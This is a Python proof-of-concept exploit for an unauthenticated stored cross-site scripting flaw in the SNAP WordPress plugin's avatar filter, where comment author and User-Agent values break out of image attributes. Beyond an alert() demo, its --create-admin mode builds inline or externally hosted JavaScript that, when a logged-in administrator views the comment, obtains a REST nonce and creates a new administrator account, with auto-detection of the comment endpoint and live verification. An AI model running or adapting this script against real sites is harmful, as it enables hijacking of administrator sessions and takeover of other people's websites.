#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC

Vulnerable sink : inc/nxs_functions_wp.php:965-975
                   filter get_avatar -> <img alt='{comment_author}' src='{comment_agent}' />
Attacker       : unauthenticated visitor (posts a comment)
Trigger        : any visitor / admin viewing the comment thread (avatar rendered)

Usage:
    python3 poc.py --url http://localhost/wp
    python3 poc.py --url http://localhost/wp/?p=1 --post-id 1
    python3 poc.py --url http://localhost/wp --verify
    python3 poc.py --url http://localhost/wp --author "x' onmouseover='alert(1)"

Requirements:
    pip install requests
"""

import argparse
import re
import sys
import urllib.parse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[!] 'requests' not installed. Run: pip install requests")

DEFAULT_PAYLOAD_AUTHOR = "x' onmouseover='alert(document.domain)"
DEFAULT_PAYLOAD_AGENT = "SNAP||https://evil.invalid/x' onerror='alert(document.domain)"
DEFAULT_COMMENT_URL = "https://twitter.com/pwned"


ADMIN_JS_TEMPLATE = """(async()=>{
  const base=document.querySelector('link[rel="https://api.w.org/"]').href;
  const nonceUrl=base.replace('wp-json/','wp-admin/admin-ajax.php?action=rest-nonce');
  const n=await (await fetch(nonceUrl)).text();
  const body=new URLSearchParams({
    username:'__USER__',password:'__PWD__',email:'__EMAIL__',
    'roles[0]':'administrator'});
  await fetch(base+'wp/v2/users',{method:'POST',headers:{'X-WP-Nonce':n},body:body});
})();"""


def build_admin_js(user, pwd, email):
    return (ADMIN_JS_TEMPLATE
            .replace("__USER__", user)
            .replace("__PWD__", pwd)
            .replace("__EMAIL__", email))


def build_admin_payload(js_url, agent):
    """Build comment_agent payload that loads an external JS in the admin context."""
    escaped = js_url.replace("'", "&#39;")
    # Break out of src='...', inject onerror (double-quoted attr), swallow trailing quote.
    return (agent.split("SNAP||")[0] + "SNAP||x' onerror="
            '"var s=document.createElement(\'script\');s.src=\''
            + escaped
            + '\';document.body.appendChild(s)" z=\'')


def build_inline_payload(user, pwd, email):
    """Build a self-contained payload (no external JS) stored in comment_agent.

    WP core's wptexturize mangles straight quotes in the rendered block HTML
    ('->&#8216;/&#8217;, "-&#8221;), which breaks quote-delimited JS. So the
    inline JS uses ONLY backticks for strings (untouched by wptexturize) and the
    injected onerror attribute is single-quoted (survives, proven by demo).
    `>` and `&` become entities but decode back before JS runs.
    """
    js = (
        "fetch(`/wp/wp-admin/admin-ajax.php?action=rest-nonce`)"
        ".then(r=>r.text()).then(n=>fetch(`/wp/wp-json/wp/v2/users`,"
        "{method:`POST`,headers:{`X-WP-Nonce`:n},"
        "body:`username=" + user + "&password=" + pwd + "&email=" + email + "&roles[0]=administrator`}))"
    )
    author = "x"
    agent = "SNAP||x' onerror='" + js + "' z='"
    if len(agent) > 254:
        print(f"[!] Inline payload too long ({len(agent)}/254 chars). "
              "Use shorter username/password/email.")
        sys.exit(1)
    for bad in ("'", '"'):
        if bad in js:
            print(f"[!] Inline JS must not contain {bad!r} (mangled by wptexturize).")
            sys.exit(1)
    if "<" in agent:
        print("[!] Payload must not contain '<' (stripped by WP core).")
        sys.exit(1)
    return author, agent


def fetch_page(base_url, timeout):
    """GET the target page (plain fetch, browser-like UA)."""
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        r = requests.get(base_url, headers=headers, verify=False, timeout=timeout)
    except requests.exceptions.RequestException as exc:
        sys.exit(f"[!] Could not fetch {base_url}: {exc}")
    return r


def build_target(base_url, post_id, timeout):
    """Return (post_id, comments_endpoint, comment_form_url).

    Auto-detects the real wp-comments-post.php endpoint and the post id
    from the comment form rendered on the page (works with pretty permalinks).
    """
    base = base_url.rstrip("/")

    # 1) Explicit --post-id: endpoint is wp-comments-post.php next to the WP root.
    #    The WP root is the longest prefix that is also a URL; for a permalink
    #    like  http://host/wp/2026/08/18/poc/  the root is  http://host/wp .
    if post_id:
        root = derive_wp_root(base)
        return post_id, root + "/wp-comments-post.php", base

    # 2) Auto-detect from the rendered page (comment form).
    print(f"[*] Auto-detecting post id / comment endpoint from {base} ...")
    r = fetch_page(base, timeout)
    html = r.text

    # Comment form action -> real wp-comments-post.php endpoint.
    m = re.search(r'action=(["\'])([^"\']*wp-comments-post\.php)[^"\']*\1', html, re.I)
    if m:
        endpoint = m.group(2)
        if endpoint.startswith("/"):
            parsed = urllib.parse.urlparse(base)
            endpoint = f"{parsed.scheme}://{parsed.netloc}{endpoint}"
        endpoint = endpoint.replace("&#038;", "&").replace("&amp;", "&")
    else:
        endpoint = ""

    # Hidden comment_post_ID field.
    m = re.search(r'name=["\']comment_post_ID["\'][^>]*value=["\'](\d+)["\']', html, re.I) or \
        re.search(r'value=["\'](\d+)["\'][^>]*name=["\']comment_post_ID["\']', html, re.I)
    auto_pid = m.group(1) if m else ""

    if not endpoint:
        root = derive_wp_root(base)
        endpoint = root + "/wp-comments-post.php"
        print(f"[?] Comment form not found on page; falling back to endpoint guess: {endpoint}")

    if auto_pid:
        print(f"[+] Detected comment_post_ID = {auto_pid}")
        print(f"[+] Detected comment endpoint = {endpoint}")
        return auto_pid, endpoint, base

    if post_id:
        return post_id, endpoint, base

    print("[?] --post-id not given and could not be detected, assuming post id = 1")
    return "1", endpoint, base


def derive_wp_root(url):
    """Best-effort: strip permalink segments until we reach the WP install root."""
    parsed = urllib.parse.urlparse(url)
    parts = [p for p in parsed.path.split("/") if p]
    # WP subdir installs usually look like /wp/YYYY/MM/DD/slug/ or /wp/?p=N
    # Try progressively shorter prefixes; keep the first that contains wp-admin/wp-includes
    # heuristics aside, we simply keep from the last known wordpress subdir if present.
    for i in range(len(parts), 0, -1):
        prefix = "/" + "/".join(parts[:i])
        if prefix in ("/wp", "/wordpress", "/blog", "/cms"):
            return f"{parsed.scheme}://{parsed.netloc}{prefix}"
    # Fallback: drop the first two segments (date-based pretty permalink /YYYY/MM/DD/slug/)
    if len(parts) >= 3 and re.match(r"^\d{4}$", parts[0]):
        return f"{parsed.scheme}://{parsed.netloc}/" + "/".join(parts[1:2])
    return f"{parsed.scheme}://{parsed.netloc}"


def submit_comment(endpoint, post_id, author, email, url, comment, ua, timeout):
    data = {
        "comment_post_ID": post_id,
        "author": author,
        "email": email,
        "url": url,
        "comment": comment,
        "comment_parent": "0",
    }
    headers = {
        "User-Agent": ua,
        "Referer": endpoint,
    }
    print(f"[*] POST -> {endpoint}")
    print(f"[*] comment_post_ID : {post_id}")
    print(f"[*] author          : {author}")
    print(f"[*] email           : {email}")
    print(f"[*] url             : {url}")
    print(f"[*] User-Agent      : {ua}")
    print()

    try:
        r = requests.post(
            endpoint,
            data=data,
            headers=headers,
            allow_redirects=False,
            verify=False,
            timeout=timeout,
        )
    except requests.exceptions.RequestException as exc:
        sys.exit(f"[!] Request failed: {exc}")

    loc = r.headers.get("Location", "")
    status = r.status_code

    print(f"[*] HTTP {status}  Location: {loc}")

    if status in (301, 302, 303) and loc:
        print("[+] Comment accepted by wp-comments-post.php (redirect = success).")
    else:
        body = r.text or ""
        # WordPress returns a plain error message with a 200 status in some cases.
        for needle in ("must be logged in", "comments are closed", "closed for this item",
                       "Error:", "duplicate", "too quickly", "spam"):
            if needle.lower() in body.lower():
                print(f"[!] Blocked by WordPress: '{needle}'")
                print("    Tips: comments may be closed/registration-required, "
                      "or duplicate/flood protection triggered.")
                break
        else:
            print("[?] Non-redirect response - review manually (may still be stored).")

    return status, loc, r


def verify(post_url, marker, timeout):
    """Fetch the post page and check whether the marker appears in the HTML."""
    print(f"\n[*] Verifying: fetching {post_url}")
    try:
        r = requests.get(post_url, verify=False, timeout=timeout)
    except requests.exceptions.RequestException as exc:
        print(f"[!] Verify request failed: {exc}")
        return
    if marker in r.text:
        print("[+] MARKER FOUND - payload rendered on the page (XSS confirmed live).")
        idx = r.text.find(marker)
        snippet = r.text[max(0, idx - 120): idx + len(marker) + 60]
        print(f"[+] Snippet: ...{snippet}...")
    else:
        print("[-] Marker not found in the page.")
        print("    Possible reasons:")
        print("     - comment not approved yet (check moderation queue and approve it),")
        print("     - theme does not call get_avatar($comment),")
        print("     - show_avatars option is off,")
        print("     - wrong post id / wrong URL.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SNAP stored XSS via get_avatar filter (unauthenticated).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="Site URL, e.g. http://localhost/wp")
    parser.add_argument("--post-id", help="comment_post_ID (auto-guessed when omitted)")
    parser.add_argument("--author", default=DEFAULT_PAYLOAD_AUTHOR,
                        help="comment author payload (breaks out of alt='...')")
    parser.add_argument("--email", default="pwn@example.com", help="comment email")
    parser.add_argument("--comment", default="test", help="comment body")
    parser.add_argument("--user-agent", dest="user_agent", default=DEFAULT_PAYLOAD_AGENT,
                        help="User-Agent payload (stored as comment_agent)")
    parser.add_argument("--comment-url", dest="comment_url", default=DEFAULT_COMMENT_URL,
                        help="'url' field; must contain twitter.com for the sink to trigger")
    parser.add_argument("--create-admin", nargs="?", const="poc-admin:poc-admin",
                        metavar="USER:PASS",
                        help="Escalate: create a new admin once an admin opens the page. "
                             "Format 'username:password' (default when flag used bare: poc-admin:poc-admin)")
    parser.add_argument("--js-url", dest="js_url",
                        help="Attacker-controlled JS URL loaded via onerror "
                             "(with --create-admin; omit for inline/no-hosting mode)")
    parser.add_argument("--verify", action="store_true",
                        help="After submitting, fetch the post page and check rendering")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    if "twitter.com" not in args.comment_url.lower():
        print("[!] Warning: --comment-url must contain 'twitter.com' "
              "(or use 'facebook.com' + User-Agent exactly 'SNAP') for the sink to trigger.")

    author = args.author
    user_agent = args.user_agent
    effect_note = "alert() demo (popup)"

    if args.create_admin:
        if ":" not in args.create_admin:
            sys.exit("[!] --create-admin must be USER:PASS, e.g. u:p")
        user, pwd = args.create_admin.split(":", 1)
        email = f"{user}@example.com"
        print("[*] Escalation mode: admin account will be created when an admin "
              "visits the page while logged in.")
        if args.js_url:
            print("    (payload loads external JS)")
            print("=" * 62)
            print("[*] HOST THIS FILE AS x.js (or point --js-url at it):")
            print("=" * 62)
            print(build_admin_js(user, pwd, email))
            print("=" * 62)
            user_agent = build_admin_payload(args.js_url, args.user_agent)
            author = "x' onmouseover='1"
            effect_note = "onerror loads external JS in admin session -> REST user create"
        else:
            print("    (INLINE payload - no external JS/file hosting needed)")
            author, user_agent = build_inline_payload(user, pwd, email)
            effect_note = "inline onerror in admin session -> REST user create (no external JS)"

    post_id, endpoint, post_url = build_target(args.url, args.post_id, args.timeout)

    status, loc, r = submit_comment(
        endpoint, post_id, author, args.email, args.comment_url,
        args.comment, user_agent, args.timeout,
    )

    print()
    print("[*] Stored payload summary:")
    print(f"    alt injection : {author}")
    print(f"    src injection : {user_agent}")
    print(f"    Effect        : {effect_note}")

    if args.verify:
        page = loc or post_url
        if page.startswith("/"):
            parsed = urllib.parse.urlparse(args.url)
            page = f"{parsed.scheme}://{parsed.netloc}{page}"
        # Marker: any fragment of the injected attributes (use the author payload).
        marker = author.split("'")[0] + "' onmouseover='"
        verify(page, marker, args.timeout)
    else:
        print()
        print("[*] Done. Approve the comment if it is held in moderation, then open the post page.")
        print("    Or re-run with --verify to check rendering automatically.")


if __name__ == "__main__":
    main()
